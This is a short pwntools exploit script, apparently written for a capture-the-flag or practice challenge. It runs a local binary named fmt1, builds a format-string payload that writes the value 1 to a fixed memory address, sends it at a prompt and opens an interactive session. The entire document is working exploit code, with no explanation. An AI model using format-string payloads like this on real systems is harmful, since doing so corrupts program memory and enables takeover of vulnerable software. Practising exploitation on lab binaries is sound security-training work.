from pwn import *

p = process("./fmt1")


payload = fmtstr_payload(7, {0x0804c02c: 1})
pause()
p.sendlineafter(b":", payload)
p.interactive()